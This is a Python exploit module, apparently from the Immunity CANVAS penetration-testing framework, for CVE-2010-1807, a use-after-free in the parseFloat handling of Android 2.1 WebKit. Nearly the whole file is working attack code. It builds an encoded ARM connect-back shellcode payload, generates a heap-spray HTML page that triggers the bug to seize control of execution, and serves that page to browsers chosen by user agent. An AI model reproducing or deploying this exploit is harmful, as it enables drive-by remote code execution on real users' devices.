#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2010
# http://www.immunityinc.com/CANVAS/ for more information

# Tested on: Android 2.1-update1 ARM EABI, AVD Emulator + Samsung Galaxy S (t-mobile edition)

import sys
import socket
if "." not in sys.path:
    sys.path.append(".")
    
import canvasengine

from exploitutils import *
from httpclientside import httpclientside
from libs.ua_parser import user_agent_parser
from shellcode.standalone.linux.arm.payloads import payloads as arm_payloads


NAME                            = "Android 2.0/2.1 webkit parsefloat"
DESCRIPTION                     = "Use after free vulnerability on webkit allows for arbitrary code execution (Android)"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Google"
DOCUMENTATION["Repeatability"]  = "Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"]       = "CVE-2010-1807"
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1807"
DOCUMENTATION["References"]     = "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-1807"
DOCUMENTATION["Date public"]    = "00/00/0000"

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["Linux"] ]
PROPERTY['VERSION']             = ['2.1']
PROPERTY['DELIVERY']            = 'HTTP'

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.htmlfile           = "index.html"
        self.filename           = self.htmlfile
        self.autoFind           = False
    
    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]
    
    def is_vulnerable(self, info_dict):
        # User-Agent: Mozilla/5.0 (Linux; U; Android 2.1-update1; en-us; sdk Build/ECLAIR) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17
        parsed = user_agent_parser.Parse(info_dict['user_agent'])

        if parsed['os']['family'] == 'Android' and \
           parsed['os']['major'] == '2' and \
           parsed['os']['minor'] == '1' and \
           parsed['os']['patch'] == 'update1':
            return 100
        
        return 0

    def displayVersions(self):
        return

    def getArgs(self):
        self.filename = self.argsDict.get('filename', self.filename)
        
    def run(self):
        self.getArgs()        
        html            = self.makefile()
        
        self.log("[+] Opening HTML %s for output" % self.filename)
        fd = file(self.filename, 'wb+')
        fd.write(html)
        fd.close()

        self.log("[+] wrote to %s" % self.filename)
        return True

    ## SPIKE Proxy Callbacks ...

    def makefile(self):
        NOTES = """
        So the bug primitive allows us to take control of r1, which is used to ld a pointer into r3, which then
        turns into the pc. To make the heap fill more effective, we use a NOOP that is both a NOOP and a valid
        address that is likely to point into the NOOPS.
        """

        # Create payload
        p = arm_payloads()
        payload = p.callback(self.callback.ip, self.callback.port, universal=True, fork_exit=False)
        bincode = p.xorencode(p.assemble(payload))

        # Create the JS unescape version
        def tojs(seq):
            seq.reverse()
            return '\\u%02x%02x' % tuple(seq)

        jscode = "".join([tojs(map(ord, bincode[i:i+2])) for i in range(0, len(bincode), 2)])

        # our trigger html
        html = """
<html>
<head>
<script>
    function setup()
    {
        var nopaddr = unescape("\u33bc\u0057"); // This is both a noop and a valid address that points into our noops
         
        while (nopaddr.length <= 0x1000) {
            nopaddr += nopaddr;
        }
            
        var payload = nopaddr + """
        

        html += "unescape('" + jscode + "');"
        html += """
        
        memfill = new Array();

        // fill heap
        for (i = 0; i < 0x1000; i++) {
            memfill[i] = payload;
            document.write(memfill[i] + "<i>");
        }
        
        trigger();
    }

    function trigger()
    {
        var span = document.createElement("div");
        document.getElementById("main").appendChild(span);
        span.innerHTML = -parseFloat("NAN(ffffe005733bc)"); // this controls r1, from which pc ld is controlled
    }
</script>
</head>

<body id="main">
<script>
    setup();
</script>
</body>

</html>
"""
        return html
        
    def makesploit(self, clientheader, clientbody):    
        from libs.spkproxy import header, body
        h           = header('SERVER')
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])
        
        self.log("[+] User agent of connecting host: %s" % user_agent)        
        if clientheader.URL.count(self.htmlfile):
            self.log("[+] Sending HTML")
            b.setBody(self.makefile())
        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')
        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
